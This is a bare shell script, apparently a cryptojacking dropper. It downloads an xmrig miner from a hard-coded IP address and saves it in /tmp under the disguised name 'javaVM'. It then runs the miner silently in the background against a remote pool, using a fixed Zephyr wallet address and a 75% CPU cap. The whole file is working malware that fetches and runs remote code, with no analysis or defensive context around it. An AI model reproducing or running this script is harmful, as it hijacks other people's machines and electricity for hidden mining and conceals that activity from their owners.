#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
fi
